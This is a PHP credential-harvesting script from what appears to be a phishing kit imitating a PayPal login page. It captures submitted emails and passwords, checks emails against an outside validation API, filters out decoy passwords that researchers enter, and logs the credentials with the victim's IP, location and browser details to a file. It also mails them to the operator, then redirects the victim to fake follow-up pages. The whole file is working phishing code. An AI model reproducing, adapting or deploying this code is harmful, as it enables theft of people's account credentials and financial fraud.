<?php
include '../mine.php';
if ($API_KEY!=="Fucked_By_DNThirTeen_L34kC0de") {
    echo "<br><br><br><h1><b><center>K O N T O L";
}else{
$pas=$_POST['PWD'];
function Check_($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    $result = curl_exec($curl);
    return $result;
    curl_close($curl);
}
if(isset($_POST['EML'])&&isset($_POST['PWD'])){
    if ($true_login=="yes") {
    $viip = @json_decode(Check_("https://dnthirteen.r00x.dj/api.php?email=" . $_POST['EML']));
    if ($viip->status == 'Live') {
        $check = "true";
    } else {
        $check = "false";
    }
    }else{
        $check = "true";
    }
	$check2 = "true";
if (strpos($pas,'fuck') !== false || strpos($pas,'1234') !== false || strpos($pas,'4321') !== false || strpos($pas,'qwer') !== false || strpos($pas,'rewq') !== false || strpos($pas,'gotofindgoodjob') !== false || strpos($pas,'stupid') !== false || strpos($pas,'spammer') !== false || strpos($pas,'fuckingspam') !== false || strpos($pas,'spam') !== false || strpos($pas,'sonofbitch') !== false || strpos($pas,'   ') !== false || strpos($pas,'googlebot') !== false) {
		$check3 = "false";
	}else{
			$check3 = "true";
	}
}
if(isset($_POST['EML'])&&isset($_POST['PWD'])){
if ($check=="true"&&$check2=="true"&&$check3=="true") {
	session_start();
	$_SESSION['screen']=$_POST['screen'];
	$_SESSION['EML']=$_POST['EML'];
	$msg="=========== <[ -".$scamname."- PPL LOGIN ]> ===========\r\n";
	$msg.="EMAIL		: {$_POST['EML']}\r\n";
	$msg.="PASS		: {$_POST['PWD']}\r\n";
	$msg.="---------------------- IP Info ----------------------\r\n";
	$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
	$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
	$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
	$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
	$msg.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$msg.="=========== <[ THANKS TO SH33NZ0 ]> ===========\r\n\r\n\r\n";
	if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
	fwrite($save,$msg);
	fclose($save);
}
	$subject="-".$scamname."- PPL LOGIN [".$_POST['EML']."] From [".$_SESSION['ip_countryName']."]";
	$headers="From: New PPL Login <newlogin@sh33nz000000.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
		if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
}
		if ($show_unusual_activity=="yes") {
	exit(header("Location: ../../app/unusual_activity"));
}else{
	exit(header("Location: ../../app/process"));
}
}else{
	exit(header("Location: ../../app/signin?invalid"));

	}
}else{
	     header('HTTP/1.0 404 Not Found');

}
}
?>